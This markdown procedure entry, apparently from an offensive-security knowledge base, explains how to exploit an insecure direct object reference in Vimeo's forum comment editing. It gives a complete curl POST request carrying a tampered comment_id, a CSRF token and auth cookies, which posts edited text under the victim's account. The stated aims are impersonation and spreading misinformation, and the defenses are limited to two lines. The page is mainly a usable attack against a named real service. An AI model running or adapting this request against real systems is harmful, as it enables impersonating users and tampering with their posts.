---
tags:
  - impersonation
  - post-request
  - vimeo
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/vimeo-post-comment-edit]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:23.414Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 2a4d1398-87cd-4664-a7f5-8503a8645779
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Submit-Edited-Comment-as-Another-User

## Summary

This procedure completes the IDOR exploitation by editing the loaded form for another user's comment and submitting the POST request, resulting in the changes being posted under the victim's account.

## Description

With the unauthorized edit form loaded, modify the comment text (e.g., add a URL or altered message) and submit. The POST includes the tampered comment_id, CSRF token, and browser version data. Due to missing validation, the server applies the edit as if from the owner, enabling impersonation. Requires capturing the token from the form.

## Requirements

1. Loaded edit form with valid CSRF token
2. Tampered comment_id
3. Full authentication cookies including xsrft

## Defense

Defensive measures and detection strategies:

- Validate user ownership on all edit submissions
- Anomaly detection on comment edit frequency or content changes

## Objectives

1. Persist unauthorized modifications
2. Achieve user impersonation in forums
3. Spread misinformation via altered comments

## Instructions

### Step 1: Edit Content in Form

**Context**: Modify the text in the loaded form.

Change to something like "Pimped & posted ;-)" with a URL.

### Step 2: Intercept and Submit POST

**Context**: Send the edited data with the original comment_id.

**Command** ([[commands/vimeo-post-comment-edit]]):

```bash
curl -X POST "https://vimeo.com/121947416" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: https://vimeo.com/forums/wanted_and_offered/topic:130606" \
  -H "Cookie: [insert full auth cookies including xsrft]" \
  --data-urlencode "text=Pimped%20%26%20posted%20%3B-)%20http%3A%2F%2Fthekitesurfchannel.com%2Fvideos%2Fi-am-gold-episode-2%2F" \
  --data-urlencode "action=edit_comment" \
  --data-urlencode "comment_id=13010972" \
  --data-urlencode "token=3a0822b94e27d8255ada31b02cc43ddc.2747550b08185735962e460fafcbae86" \
  --data-urlencode "version={\"name\":\"chrome\",\"version\":41,...}"
```

> Expected output: Success response; comment updated under victim's name.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/vimeo-post-comment-edit]]

## Tools Used


## Tags

- impersonation
- post-request
